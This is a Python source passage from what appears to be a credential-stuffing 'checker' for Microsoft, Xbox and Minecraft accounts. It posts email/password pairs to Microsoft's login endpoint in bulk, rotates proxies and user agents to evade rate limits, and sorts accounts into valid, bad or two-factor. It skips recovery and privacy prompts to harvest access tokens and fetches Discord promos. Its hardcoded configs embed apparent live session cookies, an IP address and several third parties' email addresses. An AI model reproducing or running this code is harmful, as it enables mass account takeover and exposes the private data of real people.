        try: fetch_discord_promos(session, email, password, xbox_token, fname)
        except Exception: pass
        return True
    return True
def mc_token(session, uhs, xsts_token):
    global retries
    attempts = 0
    _no_proxy = is_no_proxy()
    while attempts < maxretries:
        attempts += 1
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f'XBL3.0 x={uhs};{xsts_token}'}, headers={'Content-Type': 'application/json'}, timeout=6)
            if mc_login.status_code == 429:
                if not _no_proxy:
                    session.proxies = getproxy()
                time.sleep(0.15 if not _no_proxy else 0.3)
                continue
            else:
                return mc_login.json().get('access_token')
        except Exception:
            if not _no_proxy:
                session.proxies = getproxy()
            continue
    return None
RE_SFTTAG_VALUE = re.compile(r'value=\\"(.+?)\\"|value="(.+?)"|sFTTag:\'(.+?)\'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"', re.S)
RE_URLPOST_VALUE = re.compile(r'"urlPost":"(.+?)"|urlPost:\'(.+?)\'|urlPost:"(.+?)"|<form.*?action=\\"(.+?)\\"', re.S)
RE_IPT = re.compile(r'(?<="ipt" value=").+?(?=">)')
RE_PPRID = re.compile(r'(?<="pprid" value=").+?(?=">)')
RE_UAID = re.compile(r'(?<="uaid" value=").+?(?=">)')
RE_ACTION_FMHF = re.compile(r'(?<=id="fmHF" action=").+?(?=" )')
RE_RETURN_URL = re.compile(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)')

_thread_local = threading.local()

DEVICE_USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 PKeyAuth/1.0',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 PKeyAuth/1.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36',
]

def get_random_device_ua():
    return random.choice(DEVICE_USER_AGENTS)

def get_thread_session():
    if not hasattr(_thread_local, 'session') or _thread_local.session is None:
        session = requests.Session()
        session.verify = False
        pool_size = max(1000, int(config.get('connection_pool_size', 1000)))
        retry_strategy = Retry(total=0, connect=0, read=0)
        adapter = HTTPAdapter(pool_connections=pool_size, pool_maxsize=pool_size, max_retries=retry_strategy)
        session.mount('https://', adapter)
        session.mount('http://', adapter)
        session.headers.update({
            'User-Agent': get_random_device_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        _thread_local.session = session
    return _thread_local.session

def create_optimized_session():
    return get_thread_session()

_LOGIN_CONFIGS = [
    dict(
        url=(
            "https://login.live.com/ppsecure/post.srf"
            "?username=%7bemail%7d&client_id=0000000048170EF2"
            "&contextid=072929F9A0DD49A4&opid=D34F9880C21AE341"
            "&bk=1765024327&uaid=a5b22c26bc704002ac309462e8d061bb"
            "&pid=15216&prompt=none"
        ),
        ppft=(
            "-Drzud3DzKKJtVD9IfM5xwJywwEjJp5zvvJmrSyu*RKOf"
            "!PbgSCQ7ReuKFS*sIpTV5r28epGtqBhqH3JYvND4!onwSWz"
            "2JEkvdeewUQC6HmAXRgjYBzSlf0mjEYbx3ULc7oy5fUK3LDS"
            "b*CnkAG03FLzwVPmT5WjYu4sE5Wqd93pCx0USJK4jelAWNvs"
            "Mog0Rmj90tmeCd*1pDYjkINyPEgQSkv6y5GPuX!GmYwKccALU"
            "t*!SRaI02p*XUqePtNtJzw$$"
        ),
        cookie=(
            "MSPRequ=id=N&lt=1765024327&co=1; "
            "uaid=a5b22c26bc704002ac309462e8d061bb; "
            "MSPOK=$uuid-90ce4cdb-2718-4d7e-9889-4136cfacc5b2; "
            "OParams=11O.DhmByHnT9kscyud7VyWQt5uWQuQOYWZ9O2v5E49mKx"
            "VoKsSZaB4KnwkAQCVjghW9A6M8syem4sO!g4KOfietehdD7U2eXeVo8"
            "eUsorIQv1deGf6v43egdNizv1*agwrVh2OTg7pu2SRE3SougNTvzlNU"
            "Ne1BgtO4HFlLRm6UoEW3PNBIxuVPmFBiPs0wEU162jlfO8yA1!QZV7K"
            "KArG8NPChj0kf1IOfR95k0fIfa0!fDW8Md44pKHa3rkU0Um0KB03YEB"
            "dWMOAbJlX5RONIL3M31WhD4LG3GPAoBPAMCN9fMk2rHlwix8g6MOW3H"
            "KxDT4I0TlKrYHDBJejZWSmI23T3v2kr1MKaL9vEQoaTwOJf9VloMFBi"
            "7yB!kisHZn0BkjE!HGWhaliwYdluhJUCu1g$"
        ),
    ),
    dict(
        url=(
            "https://login.live.com/ppsecure/post.srf"
            "?username=%7bemail%7d&client_id=0000000048170EF2"
            "&contextid=F3FB0F6AB3D6991E&opid=5F188DEDF4A1266A"
            "&bk=1768757278&uaid=b1d1e6fbf8b24f9b8a73b347b178d580"
            "&pid=15216&prompt=none"
        ),
        ppft=(
            "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3Hmm"
            "MLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpV"
            "aBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCu"
            "cF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI"
            "2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$"
        ),
        cookie=(
            "MSFPC=GUID=cd3df40453784149a05eb0e8d7b0aaf5&HASH=cd3d&LV=202510&V=4&LU=1761393873491; "
            "MUID=009CC129162F6E173020D77717446F0A; "
            "uaid=b1d1e6fbf8b24f9b8a73b347b178d580; "
            "MSPRequ=id=N&lt=1768757278&co=1; "
            "MSPOK=$uuid-a26bdf97-2619-4f16-ba61-6b189e1f6e0f"
        ),
    ),
    dict(
        url=(
            "https://login.live.com/ppsecure/post.srf"
            "?username=%7bemail%7d&client_id=000000004C12AE6F"
            "&contextid=A9B8C7D6E5F40321&opid=1A2B3C4D5E6F7890"
            "&bk=1760000001&uaid=c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8"
            "&pid=15216&prompt=none"
        ),
        ppft=(
            "-DxY9Z*wV4U!tS8rQ3p2NmLkJiHgFeDcBaZyXwVuTsRqPoNn"
            "MlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCbAzYxWvUtSr"
            "QpOnMlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCbAzYxWv"
            "UtSrQpOnMlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCb$$"
        ),
        cookie=(
            "MSFPC=GUID=abcdabcdabcdabcdabcdabcdabcdabcd&HASH=abcd&LV=202503&V=4; "
            "MUID=12341234123412341234123412341234; "
            "uaid=c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8; "
            "MSPRequ=id=N&lt=1760000001&co=1; "
            "MSPOK=$uuid-b452a8d1-1234-4aef-962d-e9a37c2798b5"
        ),
    ),
    dict(
        url=(
            "https://login.live.com/ppsecure/post.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        ),
        ppft=(
            "-Da1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1V2W3"
            "X4Y5Z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7"
            "v8w9x0y1z2A3B4C5D6E7F8G9H0I1J2K3L4M5N6O7P8Q9R0S1"
            "T2U3V4W5X6Y7Z8a9b0c1d2e3f4g5h6i7j8k9l0m1n2o3$$"
        ),
        cookie=(
            "MSFPC=GUID=efghefghefghefghefghefghefghefgh&HASH=efgh&LV=202504&V=4; "
            "MUID=98769876987698769876987698769876; "
            "uaid=c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8; "
            "MSPOK=$uuid-c632b4d1-5678-4aef-962d-e9a37c2798b5"
        ),
    ),
    dict(
        url=(
            "https://login.live.com/ppsecure/post.srf"
            "?nopa=2&client_id=7d5c843b-fe26-45f7-9073-b683b2ac7ec3"
            "&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&contextid=F3FB0F6AB3D6991E"
            "&opid=5F188DEDF4A1266A&bk=1768757278&uaid=b1d1e6fbf8b24f9b8a73b347b178d580"
            "&pid=15216"
        ),
        ppft=(
            "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$"
        ),
        cookie=(
            "MSFPC=GUID=cd3df40453784149a05eb0e8d7b0aaf5&HASH=cd3d&LV=202510&V=4&LU=1761393873491; MUID=009CC129162F6E173020D77717446F0A; mkt=ar-EG; IgnoreCAW=1; MSCC=1768686615; MSPPre=sherazali786%40hotmail.com%7c2be5d8d4561de042%7c%7c; MSPCID=2be5d8d4561de042; NAP=V=1.9&E=1fce&C=0VWNjYfUKfbjASf4kUbKr4AFc4n10IF35NtbUOtSc4AG08wugTusVw&W=2b; ANON=A=216620AEFCFE489A881F606CFFFFFFFF&E=2028&W=2b; SDIDC=Cq55X0JYGZ8N!rMSZ2Ian1lLjhF5XFwY!QR1v0Wd1QpcAGghYgMLK4ritP4swu96zM7ATYlfHM20u3DRtrLPn2rJ9566O21OLmHZoMNkYVImbBG4c4J3BrZ!WKWScYNGPYAmEVFLzjflYgouKEGkeZu9pqaTCI!apjIPRu!NGgYUyJArWYXeo*oOVBuLUdVqmgNuognpxzDOLgWp*ZFd8*TWq*z0AD70A91BqrnG06YylMS0w1IS6PkSkVwEgrgx!JXrzFsp*erof7!c2WSX*UmGh3zd6pMQoPi4vs79DnX1GA4FnRbomQdFxPAGnovKgRKV9pzGFU661vg8Kog77WdEGCX0bHoF7sdO5bMDLw8B0bmf5mrjR2sjDThoYft1rlTKfQNv3FTYzLE1CtvGfQ8$; MSCC=212.126.118.78-IQ; fptctx2=taBcrIH61PuCVH7eNCyH0CYjjbqLuI8XF8pleSQW5NbDeyCRZYViNAurQ3yAaBxRmLcSV6E%252fd9MoeGps18M5266uj8wAKxvlEfEU28VnsGyiWwoN9uJpchm3EcNEIM1bVKGsBSFLHMNMX6NZTu2bLK6NBw5Z1rFEZ3cW0gnllt82p5bL3DqwMmDuAQXsed46u9pOuBgpLN%252f4jykqbl8VAYNSyjmmdFW%252fnJulneowM9IjhsCxz15p3XpWrsSAK3OVHfx%252fm7mYFFRvdAQEHVgvdC145BY%252bRAx6WXnfZX%252f5LwMZJpEmHRHxAlYmcy9m%252bzhseMIcXW5ZvIh%252fzmr0BV3cDQ%253d%253d; JSHP=3$trapskill%40hotmail.com$Trap$Skill$$2$0$0$3892304923238515033$0:mp_jay12%40hotmail.com$Matias$Paez$$2$0$8$14566549874157295761$0:kam_gatson%40hotmail.com$kam$Gatson$$2$0$0$13691270496574410431$0:jeannettemonjes%40hotmail.com$jeannette$monjes$$2$0$0$10117779287356229792$0; mkt1=ar-SA; amsc=sIrPTJ2b7gjpZa0ddTc4fZq0vrd+S2igyL5nagsxw/jMi8WIBShz1ngzijLEp/XjnB3K6eDI1932P7LhYiWotqrO1eekVlG6ucwVtQTrGUrMWIAOKXYuKjnVOfxQ44/aJ16LEy4BJHy9LMVw4dzNvGkNueHsRRk4FXBSCIT4CifABdqfvr/hZF/lULHIpm5ibd6X61OR1MTXRTSsOPW/6Y//MlRkgSWTS/wL3Y5B1TJ4gcSPlKrzi66vIiWZWkZF:2:3c; __Host-MSAAUTHP=11-M.C516_SN1.0.U.ChH75nzYc4V3vjuQ0DdhxWkmuksfCaHx2f4j*oDmbKRKuTaElc!PxDpcB1XE1TUAaT!u9ioX0rAKjvGF8*njS!r3vud3Vpc0!RDrAE0xwqNWcIN0Eb9KoqeJWM!oBnaXz2NcjFg4IKFZfN!PunbY30pUitN0uS6s*XSVegOS3eiv0PNrFUOpFBDU5iGUGYlQrM36lby*3FYFwfUUj8OTSoCOhdwgHFuCK0DCfkr7fHskyVtz9tm746KcVQwBVcyvGF6mYdjF68z49R3r3RvBXIYkhsLbIjt60RmWL1!p9f*A*Sc0k2VuqeUg05lg7dxgbeq8sR0x2QaHkOCzXg9gQpDSeF7AK8a5JXnJw7c!!MXe3HegRZMDMoNP!q*VfR*JU*TCPuScL50G3O*oxZroRZtVJ6FuGhdrD2ZolfWFUf*oQ9ykTuAuNxbMmQoKdiTKww8fF6U*J0Pc2kYdUP7CnF3qzxBzSr7LN3XD8CvlTHCbkVrIz*4xSFKOcsfmDoga09L18ztKlGvlTZ9HpsdxerBgjgWV7UQn3I1IRNtE4XISCC1!OmTl8x!zkrEiQKWRV6TivdSJw1na5cPzk2WoM2WT3Er9CLtGYhOFUp!OHTaw; uaid=b1d1e6fbf8b24f9b8a73b347b178d580; MSPRequ=id=N&lt=1768757278&co=1; OParams=11O.DoA1AdCWDhcFcLAmORZBM!x1dE4R8FY3ldMudB6QPkm5b5xK3dC6usjfpLK5Pglucp2wCGNZSpb2sghXSY9hdI4viu9TYH5!YArHTAOuOOIg5nRgepf8r9FE9d8Lp4T2vCg8Meaf8Hx8jJkqzeFGnI5stwf3T12suiGt7aAfh1GebK2yPsczRjdlU!ag7LWu7QQ!Y3ng1OQxiKGUtETT8J5hu1NHAqMPx*Qbl*kQ256M6LWe3kFQkZcdxk7ffcL5vw1faBTygkZk9RCBUeASqeXJ*9LN100J9m!ITVQOXBzdHZm5nHllLL8zk61DDWuQTZqHnnFpFXabnFxvxAnI6B5yrhS*loBDbvsWPXZRrF*z1EJci2oyrz8IQ15DrcwO9cHpeP*RMzQ1VyXySR2MadoTrD7dY0nruaLL0cVxWjpxPAsifi3YWeuvSfwyafxjYGEGwzM*FXT0ijrxI4HCCQFCYisuE4oXKB5f*GcklK2XL0xEh3M3U3oMKrKlPMQYqx*HkAE9sk2Xvm5PkOVJjr8mF3cZafRJsJH55g7HtCuNUefOvitPAZtH2EWWYCXVhnRlXZiZLnLw!eppm3Z1Uu3UlKqlicQoIWRErrjLRrqj6rxsOiM9Lc37GyxZ6*p!yHGqkJp8EPhudUpa!BXXDqPmBWTKsiW0WxJvq7y!lLIDrH7r99QpRaFz9ucmGpZMHkPSkh0X!DK7WGCv!hzMx!Laz9fykEXifJc0n1zgc3IdvWYCDQGTbNddoB4gPbOQivUcDc2rEh89e1TPkPI0z9!e3lhpjSMogjmMwzROsA80abMGKm!mEwS5FjzCwqJMUSaANMN!TxI5V2VaeiKcNhDlvyXPfhY!yAzcJMgcXNCTFEVIx6uSshhyGqJTnjG7hbH7w*MrepZHcr1JwK0nD2FVq4olvZVxsuVpkviKCdBl*wtXpuGolSSeLTWlK9Eg8rSI4t2OmTtLpVvUsYMNuY1mqc6wQBMSzKCDtbb5Q3Qv*zgd2vY4yh6fVneD*D4vPrDx*JBWraA*FFf7u4cC7tUgilRt!kKiyBUFm*EsPwWysCjnFxIqcfYdrXRO5L!QWRqSoTKGslJXqN0BLUfUV5P0PS*bWyAzPPchM1Nv07i5tTGtqFz8zyYf2NWq8bhxrOPOYzmtwtsCM7Y*CMbHrDE$; MSPOK=$uuid-a26bdf97-2619-4f16-ba61-6b189e1f6e0f"
        ),
    ),
]
_cfg_lock = threading.Lock()
_cfg_toomany = [0] * len(_LOGIN_CONFIGS)
_cfg_reset_at = [0.0] * len(_LOGIN_CONFIGS)

def _record_toomany(idx: int):
    now = time.time()
    with _cfg_lock:
        if now - _cfg_reset_at[idx] > 60:
            _cfg_toomany[idx] = 0
            _cfg_reset_at[idx] = now
        _cfg_toomany[idx] += 1


def _get_outlook_tokens(email, session):
    
    for _ in range(2):
        try:
            headers = {
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "return-client-request-id": "false",
                "client-request-id": str(uuid.uuid4()),
                "x-ms-sso-ignore-sso": "1",
                "correlation-id": str(uuid.uuid4()),
                "x-client-ver": "1.1.0+9e54a0d1",
                "x-client-os": "28",
                "x-client-sku": "MSAL.xplat.android",
                "x-client-src-sku": "MSAL.xplat.android",
                "X-Requested-With": "com.microsoft.outlooklite",
            }
            params = {
                "client_info": "1",
                "haschrome": "1",
                "login_hint": email,
                "mkt": "en",
                "response_type": "code",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
            }
            url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
            res = session.get(url, headers=headers, timeout=5)
            text = res.text
            if '"urlPost":"' not in text:
                continue
            urlPost = text.split('"urlPost":"')[1].split('",')[0]
            PPFT = None
            for ppft_start, ppft_end in [
                ('name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"'),
                ('name="PPFT" id="i0327" value="', '"'),
                ('"sFT":"', '"'),
                ("sFTTag:'", "'"),
            ]:
                if ppft_start in text:
                    try:
                        candidate = text.split(ppft_start)[1].split(ppft_end)[0]
                        if candidate and len(candidate) > 10:
                            PPFT = candidate
                            break
                    except Exception:
                        continue
            if not PPFT:
                continue
            cok = res.cookies.get_dict()
            return (
                urlPost, PPFT,
                res.url.split('haschrome=1')[0] if 'haschrome=1' in res.url else res.url,
                cok.get('MSPRequ', ''), cok.get('uaid', ''),
                cok.get('RefreshTokenSso', ''), cok.get('MSPOK', ''),
                cok.get('OParams', '')
            )
        except Exception:
            continue
    return None

def _get_fresh_ppft_spykii(email, session):
    
    client_ids = ['0000000048170EF2', '00000000402B5328']
    for cid in client_ids:
        try:
            r = session.get(
                'https://login.live.com/oauth20_authorize.srf',
                params={
                    'client_id': cid,
                    'redirect_uri': 'https://login.live.com/oauth20_desktop.srf',
                    'response_type': 'token',
                    'scope': 'offline_access openid profile service::outlook.office.com::MBI_SSL' if cid == '0000000048170EF2' else 'service::user.auth.xboxlive.com::MBI_SSL',
                    'display': 'touch',
                    'login_hint': email,
                    'msproxy': '1',
                },
                headers={
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0',
                    'client-request-id': str(uuid.uuid4()),
                    'Accept': 'text/html,*/*',
                },
                timeout=7,
            )
            text = r.text
            

            url_post = None
            for marker in ('"urlPost":"', "'urlPost':'"):
                if marker in text:
                    rest = text.split(marker, 1)[1]
                    end_char = '"' if marker == '"urlPost":"' else "'"
                    url_post = rest.split(end_char, 1)[0].replace('\\u0026', '&').replace(r'\u0026', '&').replace('&amp;', '&')
                    break
            if not url_post:
                m_url = re.search(r'urlPost["\']?\s*:\s*["\']([^"\'\\]+)', text) or re.search(r'action=\\*["\']([^"\'\\]+)', text)
                if m_url:
                    url_post = m_url.group(1).replace('\\u0026', '&').replace(r'\u0026', '&').replace('&amp;', '&')
            if not url_post:
                continue


            ppft = None
            for marker in ('name="PPFT"', 'name=\\"PPFT\\"', '"sFT":"', "'sFT':'", 'sFTTag:'):
                if 'name="PPFT"' in text:
                    m = re.search(r'name="PPFT"[^>]*value="([^"]+)"', text) or re.search(r'value="([^"]+)"[^>]*name="PPFT"', text)
                    if m: ppft = m.group(1); break
                if 'name=\\"PPFT\\"' in text:
                    m = re.search(r'name=\\"PPFT\\"[^>]*value=\\"([^"]+)\\"', text)
                    if m: ppft = m.group(1); break
                if '"sFT":"' in text:
                    ppft = text.split('"sFT":"', 1)[1].split('"', 1)[0]
                    break
            if not ppft:
                m_ppft = (
                    re.search(r'name=\\*["\']PPFT\\*["\'][^>]*value=\\*["\']([^"\'\\]+)', text) or
                    re.search(r'value=\\*["\']([^"\'\\]+)\\*["\'][^>]*name=\\*["\']PPFT', text) or
                    re.search(r'PPFT["\']?\s*:\s*["\']([^"\'\\]+)', text) or
                    re.search(r'sFTTag["\']?\s*:\s*["\'].*?value=\\*["\']([^"\'\\]+)', text) or
                    re.search(r'sFT["\']?\s*:\s*["\']([^"\'\\]+)', text)
                )
                if m_ppft:
                    ppft = m_ppft.group(1)
            if not ppft:
                continue

            ck = r.cookies.get_dict()
            parts = [f'{k}={ck[k]}' for k in ('MSPRequ', 'uaid', 'MSPOK', 'OParams', 'MSFPC', 'MUID') if ck.get(k)]
            if not parts:
                parts.append(f'MSPOK=$uuid-{uuid.uuid4()}')
            return url_post, ppft, '; '.join(parts)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout):
            return None
        except Exception:
            continue
    return None


def _spykii_attempt(session, email, password, url, ppft, cookie):
    
    _UA_MOB = 'Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0'
    c429 = 0
    while True:
        try:
            r = session.post(
                url,
                data={
                    'ps': '2', 'psRNGCDefaultType': '1',
                    'psRNGCEntropy': '', 'psRNGCSLK': ppft,
                    'canary': '', 'ctx': '', 'hpgrequestid': '',
                    'PPFT': ppft, 'PPSX': 'Pas', 'NewUser': '1',
                    'FoundMSAs': '', 'fspost': '0', 'i21': '0',
                    'CookieDisclosure': '0', 'IsFidoSupported': '1',
                    'isSignupPost': '0', 'isRecoveryAttemptPost': '0',
                    'i13': '1', 'login': email, 'loginfmt': email,
                    'type': '11', 'LoginOptions': '1', 'lrt': '',
                    'lrtPartition': '', 'hisRegion': '',
                    'hisScaleUnit': '', 'passwd': password,
                },
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Cookie': cookie, 'User-Agent': _UA_MOB,
                    'Referer': 'https://login.live.com/',
                    'Origin': 'https://login.live.com',
                    'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                    'Upgrade-Insecure-Requests': '1',
                },
                timeout=12, allow_redirects=False,
            )
        except Exception:
            return 'ERROR'

        code = r.status_code
        if code == 429:
            c429 += 1
            if c429 >= 4:
                return 'ERROR'
            time.sleep(min(3 * c429, 10))
            continue
        if code >= 500:
            return 'ERROR'


        loc = r.headers.get('Location', '')
        if 'access_token=' in loc:
            try:
                tok = urllib.parse.unquote(loc.split('access_token=')[1].split('&')[0])
                if tok and tok.lower() != 'none':
                    return session, tok
            except Exception:
                pass
        if 'srf?code=' in loc or 'oauth20_desktop.srf?' in loc:
            return session, None

        raw = r.text
        body = raw.lower()


        rate_limited_kws = (
            'too many times', "you've tried to sign in", "you have tried to sign in",
            'tried to sign in too many', 'too many incorrect', 'temporarily blocked',
            'try again later', 'unusual volume', 'service is temporarily unavailable',
            ',ac:null,'
        )
        if any(k in body for k in rate_limited_kws):
            return 'ERROR'


        bad_kws = (
            'your account or password is incorrect', 'password is incorrect',
            "that microsoft account doesn't exist", "account doesn't exist",
            "we couldn't find an account", 'incorrect username or password',
        )
        if any(k in body for k in bad_kws):
            return 'None'


        if 'name="fmHF"' in raw or 'id="fmHF"' in raw or 'cancel?mkt=' in raw or 'id="ipt"' in raw or 'name="ipt"' in raw:
            try:
                ipt_m = re.search(r'name="ipt"\s+value="([^"]+)"', raw) or re.search(r'id="ipt"\s+value="([^"]+)"', raw) or re.search(r'(?<="ipt" value=").+?(?=">)', raw)
                pprid_m = re.search(r'name="pprid"\s+value="([^"]+)"', raw) or re.search(r'id="pprid"\s+value="([^"]+)"', raw) or re.search(r'(?<="pprid" value=").+?(?=">)', raw)
                uaid_m = re.search(r'name="uaid"\s+value="([^"]+)"', raw) or re.search(r'id="uaid"\s+value="([^"]+)"', raw) or re.search(r'(?<="uaid" value=").+?(?=">)', raw)
                action_m = re.search(r'action="([^"]+)"', raw) or re.search(r'(?<=id="fmHF" action=").+?(?=" )', raw)
                if ipt_m and pprid_m and uaid_m and action_m:
                    ipt_v = ipt_m.group(1) if hasattr(ipt_m, 'group') and len(ipt_m.groups()) > 0 else ipt_m.group()
                    pprid_v = pprid_m.group(1) if hasattr(pprid_m, 'group') and len(pprid_m.groups()) > 0 else pprid_m.group()
                    uaid_v = uaid_m.group(1) if hasattr(uaid_m, 'group') and len(uaid_m.groups()) > 0 else uaid_m.group()
                    act_v = action_m.group(1) if hasattr(action_m, 'group') and len(action_m.groups()) > 0 else action_m.group()
                    act_v = act_v.replace('&amp;', '&')
                    r_cancel = session.post(act_v, data={'ipt': ipt_v, 'pprid': pprid_v, 'uaid': uaid_v}, headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': _UA_MOB}, timeout=8, allow_redirects=True)
                    if 'access_token=' in getattr(r_cancel, 'url', ''):
                        tok = parse_qs(urlparse(r_cancel.url).fragment).get('access_token', [None])[0]
                        if tok and tok != 'None':
                            return session, tok
                    ret_url_m = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', r_cancel.text) or re.search(r'"returnUrl":"([^"]+)"', r_cancel.text)
                    if ret_url_m:
                        ret_url = ret_url_m.group(1) if hasattr(ret_url_m, 'group') and len(ret_url_m.groups()) > 0 else ret_url_m.group()
                        ret_url = ret_url.replace('\\/', '/')
                        r_fin = session.get(ret_url, allow_redirects=True, timeout=8)
                        if 'access_token=' in getattr(r_fin, 'url', ''):
                            tok = parse_qs(urlparse(r_fin.url).fragment).get('access_token', [None])[0]
                            if tok and tok != 'None':
                                return session, tok
                    return session, None
            except Exception:
                pass
            return session, None


        if 'privacynotice.account.microsoft.com' in raw or 'privacy.microsoft.com' in body:
            try:
                priv = raw.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]
                corr = raw.split('name="correlation_id" id="correlation_id" value="')[1].split('"')[0]
                cod  = raw.split('type="hidden" name="code" id="code" value="')[1].split('"')[0]
                cli  = raw.split('type="hidden" name="client_info" id="client_info" value="')[1].split('"')[0]
                session.post(priv, data={'correlation_id': corr, 'code': cod, 'client_info': cli, 'action': 'accept'}, headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=8, allow_redirects=True)
            except Exception:
                pass
            return session, None


        tfa_kws = (
            'two-step verification', 'two-step', 'two factor',
            'verify your identity', 'verification code', 'enter the code',
            'authenticator app', 'microsoft authenticator', 'approve the request',
            'sign-in was blocked', 'account is locked', 'account has been locked',
            'unusual activity', 'suspicious activity', 'confirm your identity',
            'help us protect your account', 'keep your account secure'
        )
        tfa_raw = ('identity/confirm', 'Email/Confirm', '/abuse?mkt=', '/Abuse?mkt=')
        if any(k in body for k in tfa_kws) or any(k in raw for k in tfa_raw):
            return '2FA'


        success_kws = ('account.microsoft.com', 'signout?', 'Sign out', '/SignOut', 'profile.live.com', 'sSigninName', 'msaDisplayName')
        if any(k in raw for k in success_kws):
            return session, None


        try:
            ck = {c.name: c.value for c in session.cookies}
        except Exception:
            ck = {}
        if ck.get('WLSSC'):
            return session, None

        return 'ERROR'


def _ms_login(email, password, session, proxy):


    fresh = _get_fresh_ppft_spykii(email, session)
    if fresh:
        url_post, ppft, cookie = fresh
        result = _spykii_attempt(session, email, password, url_post, ppft, cookie)
        if result not in ('None', '2FA', 'ERROR') and result is not None:
            return result  # (session, token|None)
        if result == 'None':
            return 'None'
        if result == '2FA':
            return '2FA'


    fresh_outlook = _get_outlook_tokens(email, session)
    if fresh_outlook:
        url_post, ppft, cookie = fresh_outlook[0], fresh_outlook[1], fresh_outlook[2]
        result = _spykii_attempt(session, email, password, url_post, ppft, cookie)
        if result not in ('None', '2FA', 'ERROR') and result is not None:
            return result  # (session, token|None)
        if result == 'None':
            return 'None'
        if result == '2FA':
            return '2FA'


    cfg_order = sorted(range(len(_LOGIN_CONFIGS)), key=lambda i: _cfg_toomany[i])
    for cfg_idx in cfg_order:
        cfg = _LOGIN_CONFIGS[cfg_idx]
        url = cfg['url'].replace('%7bemail%7d', urllib.parse.quote(email))
        result = _spykii_attempt(session, email, password, url, cfg['ppft'], cfg['cookie'])
        if result == 'None':
            return 'None'
        if result == '2FA':
            return '2FA'
        if result == 'ERROR':
            _record_toomany(cfg_idx)
            continue
        if result is not None and result != 'ERROR':
            return result  # (session, token|None)

    return 'ERROR'

def authenticate(email, password, session=None, use_optimized=True):
    global retries, bad, checked, cpm, twofa
    current_try = 0
    while current_try <= maxretries:
        session = None
        proxy_raw = None
        try:
